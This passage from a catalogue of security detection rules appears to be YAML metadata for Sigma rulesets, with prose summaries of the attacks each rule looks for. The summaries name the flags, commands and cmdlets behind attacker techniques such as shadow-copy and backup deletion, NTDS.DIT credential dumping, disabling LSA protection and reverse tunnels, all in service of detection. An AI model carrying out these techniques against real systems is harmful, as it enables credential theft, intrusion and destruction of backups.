    known to store credentials through the command line. It focuses on various software
    such as PuTTY, MobaXterm, Foxmail, IncrediMail, Eudora, WinSCP, CORE FTP, and
    several VNC and VPN tools, intercepting command lines that access their registry
    paths to prevent unauthorized credential access.
  Updated-Date: '2024_09_04'
87c83d8e-5390-44ce-aa4a-d3b37e54d0a0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cf1af3850f3c8555383e52ca5f8af849
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts of CVE-2023-4966, a sensitive
    information disclosure vulnerability affecting Citrix ADC and NetScaler Gateway,
    by analyzing webserver logs. The exploitation involves unauthorized access to
    sensitive information via specific HTTP GET requests to the endpoint "/oauth/idp/.well-known/openid-configuration"
    that return a 200 status code, indicating successful access. This detection mechanism
    aims to identify malicious activity that could lead to unauthorized data exposure.
  Updated-Date: '2024_09_03'
87cc6698-3e07-4ba2-9b43-a85a73e151e2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e68fc294ea8055ef32b6255fb657e0c3
  Ruleset: sigmahq
  Summary: This rule detects attempts to export user permission data within Bitbucket.
    It identifies specific audit events related to user details export actions, including
    when the export process starts, succeeds, or fails. The detection relies on audit
    logs that require an advanced log level to capture these particular events. Such
    activity is flagged to ensure visibility into potential reconnaissance attempts,
    which could indicate an adversary gathering information. This rule helps to monitor
    and secure Bitbucket environments against unauthorized data export actions.
  Updated-Date: '2024_09_04'
87df9ee1-5416-453a-8a08-e8d4a51e9ce1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75647bf66b2283f20fda8d3d35fd09a9
  Ruleset: core
  Summary: This rule detects the deletion of Volume Shadow Copies using PowerShell
    commands that leverage Windows Management Instrumentation (WMI). The specific
    techniques monitored include the use of 'Get-WmiObject' and 'Win32_ShadowCopy'
    to list shadow copies, combined with 'Delete()' or 'Remove-WmiObject' commands
    to perform the deletion. This activity is commonly associated with attempts to
    remove backup copies to prevent system recovery from malicious actions.
  Updated-Date: '2024_09_03'
87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 36dddeced9d7ad39105225a2b1ddec7b
  Ruleset: sigmahq
  Summary: This rule detects the modification of PowerShell script execution policies
    to a potentially insecure level using the "-ExecutionPolicy" flag. It specifically
    looks for the use of command line options that include '-executionpolicy', ' -ep',
    or ' -exec', in conjunction with the policy levels 'Bypass' or 'Unrestricted'.
    These changes can indicate an attempt to reduce script execution security, which
    may be exploited for malicious purposes.
  Updated-Date: '2024_09_04'
880973f3-9708-491c-a77b-2a35a1921158:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7c975b8150fe9bbdff04aba558b0f02c
  Ruleset: sigmahq
  Summary: This rule detects suspicious command lines in Linux where a shell is used
    to execute a command that is subsequently piped into another shell. It identifies
    processes where the command starts with 'sh -c' or 'bash -c' and checks for the
    presence or ending of the pipeline to other shell commands like 'bash' or 'sh'.
    Such patterns could indicate potential misuse for defense evasion or the execution
    of encoded commands. While legitimate software may also use these patterns, their
    presence warrants further investigation.
  Updated-Date: '2024_09_04'
881834a4-6659-4773-821e-1c151789d873:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 78b2a571cc93b3bbe724560416213cb1
  Ruleset: emerging-threats
  Summary: "This rule detects communication to command-and-control (C2) servers associated\
    \ with Equation Group tools, as revealed in the ShadowBroker leak. The detection\
    \ is based on specific IP addresses involved in such communication and utilizes\
    \ firewall logs to identify these interactions. This can help identify potential\
    \ breaches orchestrated using Equation Group\u2019s C2 infrastructure."
  Updated-Date: '2024_09_03'
881b7725-47cc-4055-8000-425823344c59:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fc1f54f00203fe91c01b24cea5a92c5e
  Ruleset: core
  Summary: This rule detects image load events that involve revoked certificates as
    identified by Windows Code Integrity. It monitors specific event IDs signaling
    that a revoked image has been loaded into the system. This could indicate that
    a previously legitimate image's certificate has been revoked, either requiring
    attention from the publisher or noting that the image loading was permitted due
    to a kernel mode debugger attachment.
  Updated-Date: '2024_09_03'
8834e2f7-6b4b-4f09-8906-d2276470ee23:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2cbf341728fe7beebc4480a4db36a17d
  Ruleset: core
  Summary: This rule detects the use of specific command line flags by PsExec and
    PAExec to escalate a command line to LOCAL_SYSTEM rights. PsExec and PAExec are
    legitimate tools used for executing processes on remote systems, often employed
    by administrators for system management tasks. However, their misuse can indicate
    attempts to gain elevated privileges. The rule monitors for command lines containing
    specific patterns such as '-s cmd', '-s powershell', and similar variations that
    signal an attempt to run commands or scripts with LOCAL_SYSTEM privileges. The
    detection includes checking for the presence of the terms 'psexec' and 'paexec'
    within the command line. Instances where these tools are used by administrators
    for maintenance, or by users debugging Microsoft Intune issues, may trigger false
    positives.
  Updated-Date: '2024_09_03'
883835a7-df45-43e4-bf1d-4268768afda4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ccdcda7d1e6aa215966381e1d9fd9e36
  Ruleset: core
  Summary: This rule detects instances where regedit.exe is started with TrustedInstaller
    privileges or by ProcessHacker.exe, which may indicate privilege escalation attempts
    on a Windows system.
  Updated-Date: '2024_09_03'
883faa95-175a-4e22-8181-e5761aeb373c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b87ff6f16657f85eb1e002223d03ad43
  Ruleset: core
  Summary: This rule detects a service binary running from directories that are commonly
    associated with suspicious or non-standard locations in a Windows environment.
    These directories include various paths under 'Users', such as '\Users\Public\',
    '\$Recycle.bin\', and '\Users\All Users\', as well as system-related paths like
    'C:\Perflogs\' and '\Windows\Fonts\'. The rule specifically looks for processes
    where the parent image is either 'services.exe' or 'svchost.exe'. This type of
    activity may indicate an attempt at defense evasion or the execution of untrusted
    binaries in critical system folders.
  Updated-Date: '2024_09_03'
88516f06-ebe0-47ad-858e-ae9fd060ddea:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a175e48c5b5d777e455db23fc89d24b8
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a "rundll32" process triggered by the
    ColdSteel persistence service to execute a cleanup command by invoking one of
    its own exports. The identified indications are specific command-line arguments
    related to the service instances "msupdate," "msupdate2," or "alg" that launch
    "rundll32.exe." The command line used by this process potentially includes methods
    such as "UpdateDriverForPlugAndPlayDevicesW," "ServiceMain," or "DiUninstallDevice."
    These parameters suggest the intention to evade defenses and maintain persistence
    within a Windows environment.
  Updated-Date: '2024_09_03'
88656cec-6c3b-487c-82c0-f73ebb805503:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6a7d4b2c33bc5968b994140d063786cf
  Ruleset: sigmahq
  Summary: This rule detects the execution of UltraViewer, a legitimate desktop support
    and remote access software developed by DucFabulous Co., Ltd. UltraViewer can
    be used by adversaries to establish an interactive command and control channel
    on target systems within a network. This software is often employed for technical
    support purposes and might be permitted by application controls in certain environments.
    The detection focuses specifically on the creation of processes associated with
    UltraViewer, indicated by the product name, company, and the original file name,
    UltraViewer_Desktop.exe.
  Updated-Date: '2024_09_04'
889719ef-dd62-43df-86c3-768fb08dc7c0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b29b46aec709ad37dfe89f71321d3f98
  Ruleset: core
  Summary: This rule detects the usage of the PowerShell `New-MailboxExportRequest`
    cmdlet to export a mailbox to a remote or local share. This activity is indicative
    of ProxyShell exploitations targeting Microsoft Exchange Server vulnerabilities.
    Such exports can be part of malicious activities aiming to exfiltrate sensitive
    email data.
  Updated-Date: '2024_09_03'
88a22f69-62f9-4b8a-aa00-6b0212f2f05a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 522b89a851205f8ca2deb5883bc305dd
  Ruleset: core
  Summary: This rule detects obfuscated PowerShell scripts that use the `rundll32`
    command to execute PowerShell code. The detection focuses on specific patterns
    in the payload, including the presence of terms such as '&&', 'rundll32', 'shell32.dll',
    and 'shellexec_rundll'. Additionally, it looks for the usage of keywords like
    'value', 'invoke', 'comspec', and 'iex'. This technique is often used in evasion
    or execution tactics by malicious actors.
  Updated-Date: '2024_09_03'
88a87a10-384b-4ad7-8871-2f9bf9259ce5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 372d68e78ebbf3bda2f42646b2cfe959
  Ruleset: core
  Summary: This rule detects instances of REGSVR32.exe being used to execute DLL files
    that are hosted on remote shares. This is indicative of a potential attempt at
    defense evasion, as it leverages the REGSVR32 utility, which is commonly used
    for legitimate purposes but can be exploited by attackers to run malicious code
    from a remote source.
  Updated-Date: '2024_09_03'
88c0f9d8-30a8-4120-bb6b-ebb54abcf2a0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ebad229852f3917fa86f8b39f3224def
  Ruleset: sigmahq
  Summary: This rule detects changes to file time attributes intended to hide new
    files or alterations to existing ones. It monitors the creation of processes involving
    the `touch` command on macOS systems, specifically focusing on command-line arguments
    that signal modifications to timestamps such as `-t`, `-acmr`, `-d`, and `-r`.
    This behavior is typically associated with defense evasion tactics, where attackers
    manipulate file timestamps to disguise their activities.
  Updated-Date: '2024_09_04'
88d6e60c-759d-4ac1-a447-c0f1466c2d21:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ff7141029c0576d56e167ee643faa3af
  Ruleset: sigmahq
  Summary: This rule detects instances of Chromium-based browsers, including Brave,
    Chrome, Microsoft Edge, Opera, and Vivaldi, being executed with the 'load-extension'
    flag, indicating the use of a custom extension. This behavior can be indicative
    of attempts at persistence techniques or malicious activity, such as those documented
    in resources discussing ChromeLoader and browser-based attacks. However, legitimate
    use during activities such as security testing with tools like BurpSuite may also
    trigger this alert.
  Updated-Date: '2024_09_04'
88f46b67-14d4-4f45-ac2c-d66984f22191:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b4f3e35e8400f85a22f8e7bc81da28b0
  Ruleset: sigmahq
  Summary: This rule detects the execution of a renamed Microsoft Teams binary on
    Windows systems. It identifies instances where the original file name matches
    'msteams.exe' or 'teams.exe' but the executable is running from a location that
    does not end with the standard '\msteams.exe' or '\teams.exe' path. This anomaly
    can indicate an evasion attempt where the Microsoft Teams executable was renamed
    to circumvent security measures.
  Updated-Date: '2024_09_04'
88f680b8-070e-402c-ae11-d2914f2257f1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 389d47273bf5884521f72f0481c666ea
  Ruleset: core
  Summary: This rule detects the presence of a base64-encoded "IEX" cmdlet within
    the command line of a process. "IEX" is a shorthand for "Invoke-Expression" in
    PowerShell, which is commonly used to execute strings as commands. The detection
    focuses on variations of "IEX" with different cases and context, including instances
    where "IEX" is followed by '(' or 'New' as well as UTF16 LE encoded strings. This
    is a high-level alert given the potential for malicious use, with a particular
    emphasis on recognizing encoded commands that may attempt to obfuscate their true
    intent.
  Updated-Date: '2024_09_03'
894397c6-da03-425c-a589-3d09e7d1f750:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f1df1858d0532f6867fcbb7eae06f9aa
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation attempts of CVE-2021-40444, a
    vulnerability in Windows, by identifying suspicious process creation patterns.
    Specifically, it monitors the execution of 'control.exe' when triggered by parent
    processes such as 'winword.exe', 'powerpnt.exe', or 'excel.exe', while filtering
    out common benign invocations involving 'input.dll'. This behavior is indicative
    of in-the-wild exploitations targeting this vulnerability.
  Updated-Date: '2024_09_03'
894a8613-cf12-48b3-8e57-9085f54aa0c3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 11a63700f0dfecded6b5f5196e03c99e
  Ruleset: sigmahq
  Summary: This rule detects User-Agent strings that conclude with an equal sign,
    which may indicate base64 encoding. This kind of encoding can suggest unusual
    behavior often used in various types of cyber attacks, such as command-and-control
    communications. Detecting these strings could help identify potentially malicious
    activity in network traffic.
  Updated-Date: '2024_09_04'
89819aa4-bbd6-46bc-88ec-c7f7fe30efa6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0e9e96d443b7431e7ac066fe34d88465
  Ruleset: core
  Summary: This rule detects the use of PowerShell commandlets associated with well-known
    exploitation frameworks. These commandlets, identifiable through specific names
    within PowerShell script blocks, are indicative of potential malicious activity.
    Examples of these commandlets include "Invoke-Mimikatz," "Invoke-Nightmare," and
    "Invoke-Zerologon," which are used for various unauthorized access, data exfiltration,
    and privilege escalation tasks. Additionally, commandlets like "Get-ClipboardContents"
    and "Invoke-BypassUAC" signal attempts to capture user data and bypass security
    controls. The detection focuses on identifying these specific commandlets' presence
    in logged script blocks to flag and investigate potential security breaches.
  Updated-Date: '2024_09_03'
898d5fc9-fbc3-43de-93ad-38e97237c344:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4b0e401028f57f7c3bbcb9b50bf9dfcc
  Ruleset: sigmahq
  Summary: This rule detects an AppX package installation attempt on Windows systems
    that encounters the specific error code "0x80073cff." This error code indicates
    that the package does not meet the signing requirements, suggesting that the installation
    may involve a suspicious or potentially malicious package. This detection is important
    for identifying potential threat actors leveraging unsigned AppX packages to deploy
    malware or perform unauthorized actions.
  Updated-Date: '2024_09_04'
899133d5-4d7c-4a7f-94ee-27355c879d90:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 781270af64abaaf1be81e7b15d9b6b89
  Ruleset: sigmahq
  Summary: This rule detects the execution of Python using the "-c" flag on Windows
    systems. The "-c" flag can be used to run inline Python code directly from the
    command line, which could be employed for activities such as launching reverse
    shells or executing arbitrary Python code in real-time. The rule monitors the
    process creation logs for instances where Python executables (python.exe, python3.exe,
    and python2.exe) are utilized in this manner, while excluding processes originating
    from known legitimate sources like the official Python installation directory
    or Visual Studio Code. False positives may arise from legitimate Python libraries
    using the "-c" flag, and filtering should be adapted based on specific environmental
    contexts.
  Updated-Date: '2024_09_04'
89a9a0e0-f61a-42e5-8957-b1479565a658:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9534f3703c444ebed9d156c432fc8701
  Ruleset: core
  Summary: This rule detects attempts to bypass User Account Control (UAC) through
    the use of WSReset, a utility intended to reset the Windows Store, by identifying
    instances where the WSReset executable is run with elevated integrity levels such
    as 'High' or 'System'. This pattern matches known methods used to escalate privileges
    or evade defenses, as detailed by multiple authoritative sources on UAC bypass
    techniques.
  Updated-Date: '2024_09_03'
89ca78fd-b37c-4310-b3d3-81a023f83936:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 04759304e9a7828aa7412c7905003479
  Ruleset: core
  Summary: This rule detects the creation or update of a scheduled task that runs
    with "NT AUTHORITY\SYSTEM" privileges. It identifies commands executed via 'schtasks.exe'
    involving the options '/change' or '/create'. Additional checks ensure the task
    is set to run under high-privilege user accounts by looking for command line arguments
    that specify "NT AUTHORITY\SYSTEM" or "SYSTEM". The rule includes filters to exclude
    known false positives related to TeamViewer and Avira software installations,
    which use scheduled tasks legitimately but match the detection patterns.
  Updated-Date: '2024_09_03'
89e1490f-1a3e-452a-bbb8-b68a5f58072f:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 62c1342ae7f8f6909d0a80eb276aa53a
  Ruleset: emerging-threats
  Summary: This rule detects the execution of the GuLoader malware on a host system.
    GuLoader initiates network connections through the rundll32.exe process, which
    is spawned by an injected browser process such as Chrome, Firefox, or Microsoft
    Edge. This abnormal activity is a sign of malicious behavior, specifically indicating
    potential defense evasion tactics being employed.
  Updated-Date: '2024_09_03'
89f75308-5b1b-4390-b2d8-d6b2340efaf8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1eda08433c9095a71bc18b992537dd14
  Ruleset: sigmahq
  Summary: This rule detects the deletion of backups or system state backups via "wbadmin.exe"
    on Windows systems. This activity is often employed by ransomware operators and
    other malicious actors to disrupt recovery processes by removing backup files.
    The rule focuses on command-line instructions that include terms related to deletion
    and backups, while ensuring duplicate alerts are minimized. Legitimate uses such
    as administration scripts may trigger this detection as false positives.
  Updated-Date: '2024_09_04'
8a3038e8-9c9d-46f8-b184-66234a160f6f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9fb05ffd88a5129e6444185454cf8c17
  Ruleset: sigmahq
  Summary: This rule detects the potential use of an SSH utility to establish Remote
    Desktop Protocol (RDP) connections over a reverse SSH tunnel. Such activity can
    be indicative of attackers routing network packets to destinations that would
    otherwise be unreachable. The rule examines process creation logs on Windows systems,
    focusing on command lines containing both the RDP port (`:3389`) and typical SSH
    tunneling switches (`-L`, `-P`, `-R`, `-pw`, `-ssh`).
  Updated-Date: '2024_09_04'
8a4519e8-e64a-40b6-ae85-ba8ad2177559:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ae7d29724d79e003aa64bb3c6e2c3db9
  Ruleset: core
  Summary: This rule detects the execution of a process where the BrowserCore.exe
    has been renamed. BrowserCore.exe is typically utilized to extract Azure tokens,
    and identifying its renamed instances is crucial for security monitoring. This
    rule helps in recognizing suspicious activities related to token extraction on
    Windows systems.
  Updated-Date: '2024_09_03'
8a46f16c-8c4c-82d1-b121-0fdd3ba70a84:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ea654b096ced97df83bd9089770088a9
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "groupdel" binary, which is used
    to delete a group in Linux systems. Threat actors sometimes exploit this command
    to hide their tracks.
  Updated-Date: '2024_09_04'
8a582fe2-0882-4b89-a82a-da6b2dc32937:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7d583df9144e5cd4e10959d525bf117f
  Ruleset: core
  Summary: This rule detects suspicious and uncommon child processes originating from
    WmiPrvSE, focusing on specific executable files that are often associated with
    potentially malicious activity. The primary executable files monitored include
    certutil.exe, cscript.exe, mshta.exe, msiexec.exe, regsvr32.exe, rundll32.exe,
    verclsid.exe, and wscript.exe. Additionally, cmd.exe is examined when it spawns
    child processes involving cscript, mshta, powershell, pwsh, regsvr32, rundll32,
    or wscript, due to its propensity to lead to false positives. Filters are applied
    to exclude benign instances where WmiPrvSE.exe spawns WerFault.exe, spawns itself,
    or where msiexec.exe is used with a legitimate installation command.
  Updated-Date: '2024_09_03'
8a63cdd4-6207-414a-85bc-7e032bd3c1a2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1bdc7637fd65dcf3f05294ff7506c9ab
  Ruleset: sigmahq
  Summary: This rule detects changes in the master password of an AWS RDS database,
    potentially indicating an attempt at data exfiltration. It triggers when the event
    source is from `rds.amazonaws.com`, specifically during the `ModifyDBInstance`
    event, and when the response elements indicate a pending modification of the master
    user password. While such an event can be a benign change, it also poses a risk
    that warrants attention for security monitoring.
  Updated-Date: '2024_09_04'
8a670c6d-7189-4b1c-8017-a417ca84a086:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1dad2831bc85f26a780fc66cdfea5b53
  Ruleset: core
  Summary: 'This rule detects SQL error messages indicative of probing for an SQL
    injection attack. It includes specific error messages for different types of SQL
    databases: Oracle errors such as "quoted string not properly terminated," MySQL
    errors like "You have an error in your SQL syntax," SQL Server errors such as
    "Unclosed quotation mark," and SQLite errors including ''near "*": syntax error''
    and mismatches in UNION SELECT columns. These error messages typically arise when
    an attacker is attempting to manipulate SQL queries in a manner that could expose
    vulnerabilities. While legitimate syntax errors can trigger similar messages,
    especially with specific MySQL queries, the presence of these errors in application
    logs is flagged as highly suspicious.'
  Updated-Date: '2024_09_03'
8a7e90c5-fe6e-45dc-889e-057fe4378bd9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 14f0a6cb856073004be20a83c4febb31
  Ruleset: core
  Summary: This rule detects the execution of the SysmonEOP.exe tool, which is a proof-of-concept
    (PoC) designed to exploit a vulnerability in Sysmon, identified as CVE-2022-41120.
    The rule identifies this malicious activity by checking for the specific image
    name "SysmonEOP.exe" and matching known indicator hashes, such as 'IMPHASH=22F4089EB8ABA31E1BB162C6D9BF72E5'
    or 'IMPHASH=5123FA4C4384D431CD0D893EEB49BBEC'. This activity is critical as it
    can lead to privilege escalation on Windows systems.
  Updated-Date: '2024_09_03'
8a8379b8-780b-4dbf-b1e9-31c8d112fefb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6f2fe65e8088519ba15b95d937fc64d6
  Ruleset: core
  Summary: This rule detects scheduled task creations triggered by the 'schtasks.exe'
    executable from suspicious folders, specifically targeting the combination of
    certain command and folder paths. It monitors for the use of PowerShell, pwsh,
    and various cmd commands executed from directories like 'C:\ProgramData\' or '%ProgramData%'
    to identify potentially malicious behavior.
  Updated-Date: '2024_09_03'
8ac03a65-6c84-4116-acad-dc1558ff7a77:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1563f3536f469968a83ae88f3f54a71e
  Ruleset: sigmahq
  Summary: This rule detects a change in the Sysmon configuration on Windows systems,
    which could indicate either a legitimate reconfiguration or an attempt to manipulate
    the configuration. This is identified by monitoring for EventID 16, which is generated
    when the Sysmon configuration is modified.
  Updated-Date: '2024_09_04'
8acf3cfa-1e8c-4099-83de-a0c4038e18f0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e2793fe4026a3a7320816c8bd9f40893
  Ruleset: emerging-threats
  Summary: This rule detects the deployment of Golden Chickens malware using OCX files
    by the Evilnum APT group. It monitors process creation activities on Windows systems
    where the command line includes `regsvr32` with specific parameters and paths,
    particularly targeting the AppData\Roaming directory and OCX file extensions.
    This technique, detailed in a 2020 ESET report, is associated with defense evasion
    tactics.
  Updated-Date: '2024_09_03'
8ad1600d-e9dc-4251-b0ee-a65268f29add:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bfd83242a4cde72d0c001fdb48538aa1
  Ruleset: sigmahq
  Summary: This rule detects the usage of AWS root account credentials by identifying
    events where the user identity type is listed as "Root" and the event type is
    not categorized under AWS Service Events. Monitoring this activity is crucial,
    as the use of root credentials can indicate potential privilege escalation or
    inappropriate access attempts within the AWS environment.
  Updated-Date: '2024_09_04'
8ae51330-899c-4641-8125-e39f2e07da72:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b302fce48f86eaeb477292274c388deb
  Ruleset: core
  Summary: This rule detects strings commonly associated with command execution within
    DNS TXT answers. Specifically, it identifies commands such as 'IEX' (Invoke-Expression)
    and 'cmd.exe', which may indicate the use of DNS TXT records for command and control
    (C2) communication, typically seen in certain forms of malware attacks and malicious
    scripts. The purpose is to identify potentially suspicious activities where DNS
    TXT records are exploited for executing commands remotely.
  Updated-Date: '2024_09_03'
8b0e12da-d3c3-49db-bb4f-256703f380e5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 21324f69770cfd69c6a543f5f88ff3bb
  Ruleset: core
  Summary: This rule detects the execution of the Chisel tunneling tool on Windows
    systems by identifying specific command-line arguments associated with its operation.
    Chisel is used for tunneling and can be operated in both client and server modes.
    The detection focuses on command-line parameters such as '-socks5', '-reverse',
    and ':127.0.0.1:', which indicate tunneling activities. Various flags like '-tls-skip-verify'
    and 'r:' are also checked to distinguish legitimate use from potential malicious
    activity.
  Updated-Date: '2024_09_03'
8b244735-5833-4517-a45b-28d8c63924c0:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 52da8784afa9391941cf4b7d8407dca8
  Ruleset: emerging-threats
  Summary: This rule detects a potential exploitation attempt of CVE-2023-2283, an
    authentication bypass vulnerability in libSSH. The exploitation attempt triggers
    an error message stating that keys for curve25519 could not be generated. This
    error message indicates a possible exploitation attempt but not necessarily successful
    exploitation.
  Updated-Date: '2024_09_03'
8b48ad89-10d8-4382-a546-50588c410f0d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7187cb718d03cd26d7fcd7c5b204ab0b
  Ruleset: sigmahq
  Summary: This rule detects an appx package added to the pipeline for processing
    that was downloaded from suspicious domains. The detection focuses on event logs
    that capture package deployments, specifically targeting domains often associated
    with malicious files and activities such as GitHub, Discord, Dropbox, MEGA, Pastebin,
    and others. The objective is to identify potentially harmful packages that could
    be used for malware deployment or other unauthorized activities on Windows systems.
  Updated-Date: '2024_09_04'
8b69fd42-9dad-4674-abef-7fdef43ef92a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1d4e77edba79c7426b3d9b32b5231ebe
  Ruleset: sigmahq
  Summary: This rule detects DNS queries for subdomains related to the "Put.io" file-sharing
    website. Specifically, it looks for events on Windows DNS clients where the queried
    domain names include 'api.put.io' or 'upload.put.io'. These queries could indicate
    legitimate usage of the Put.io service, but they may also be associated with command-and-control
    activities.
  Updated-Date: '2024_09_04'
8b7273a4-ba5d-4d8a-b04f-11f2900d043a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ba913a619d0966e3e76889f0fabe1ad0
  Ruleset: sigmahq
  Summary: This rule detects changes to the HypervisorEnforcedCodeIntegrity registry
    key, specifically when the "Enabled" value is set to 0. Disabling the Hypervisor
    Enforced Code Integrity feature allows an attacker to load unsigned and untrusted
    code to run in the kernel.
  Updated-Date: '2024_09_04'
8b93a509-1cb8-42e1-97aa-ee24224cdc15:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a5eb9aa7c3c231c3c4387858cc67f592
  Ruleset: sigmahq
  Summary: This rule detects the use of the "wbadmin.exe" utility to dump highly sensitive
    files such as "NTDS.DIT" and the "SECURITY" hive, which may contain credential
    or sensitive information. Attackers can exploit this utility to access and extract
    such files. It monitors for specific file paths and command line patterns associated
    with starting backups or recoveries using "wbadmin.exe". Any matches should be
    thoroughly investigated to determine if they are legitimate backup operations
    by authorized administrators or malicious activities.
  Updated-Date: '2024_09_04'
8b9606c9-28be-4a38-b146-0e313cc232c1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a27c1c8ec27f40b25b0482b96dd609c7
  Ruleset: core
  Summary: This rule detects changes to the "LegalNoticeCaption" or "LegalNoticeText"
    registry values in Windows where the message set includes keywords commonly found
    in ransomware ransom notes, such as "encrypted," "Unlock-Password," and "paying."
    This is an indicator of potential ransomware activity, as these registry entries
    might be modified to display ransom messages to the user upon logging in.
  Updated-Date: '2024_09_03'
8bc063d5-3a3a-4f01-a140-bc15e55e8437:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4aac177f3ddd5fcc32063d4534437832
  Ruleset: sigmahq
  Summary: This rule detects suspicious PowerShell code that executes Component Object
    Model (COM) objects, specifically targeting the invocation of `GetTypeFromCLSID`
    and `ShellExecute` methods. These actions are commonly associated with privilege
    escalation and persistence techniques often used by malicious actors. The detection
    requires Script Block Logging to be enabled on Windows systems. Legitimate PowerShell
    scripts may also trigger this rule as false positives.
  Updated-Date: '2024_09_04'
8bc64091-6875-4881-aaf9-7bd25b5dda08:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e1ed3628b02bd65b0f29646320aee632
  Ruleset: core
  Summary: This rule detects suspicious process patterns indicative of NTDS.DIT file
    exfiltration, a technique used to compromise and exfiltrate Active Directory database
    files containing sensitive credentials. It identifies specific tools and commands
    associated with NTDS.DIT exfiltration efforts, such as the use of files like NTDSDump.exe
    and NTDSDumpEx.exe, and the execution of commands that reference NTDS.DIT and
    system hive files. The detection also includes patterns for typical PowerShell
    and command line operations related to NTDS.DIT manipulation and copying. Furthermore,
    it examines process executions originating from suspicious directories such as
    Apache, Tomcat, AppData, Temp, Public, and PerfLogs to catch potential malicious
    activities.
  Updated-Date: '2024_09_03'
8c0eca51-0f88-4db2-9183-fdfb10c703f9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1fd31620687c0e31d1862ca56efbf520
  Ruleset: core
  Summary: This rule detects the use of the "reg.exe" utility to disable Protected
    Process Light (PPL) protection on the Local Security Authority (LSA) process on
    Windows systems. LSA is critical for managing local security policies and authentication,
    and disabling its PPL protection can expose the system to attacks. Specifically,
    this detection looks for instances where the "reg.exe" command is used to modify
    the "SYSTEM\CurrentControlSet\Control\Lsa" registry path with the intention of
    changing the "RunAsPPL" value to 0, thereby disabling PPL protection. This behavior
    is often associated with advanced persistent threat (APT) groups aiming to evade
    defenses.
  Updated-Date: '2024_09_03'
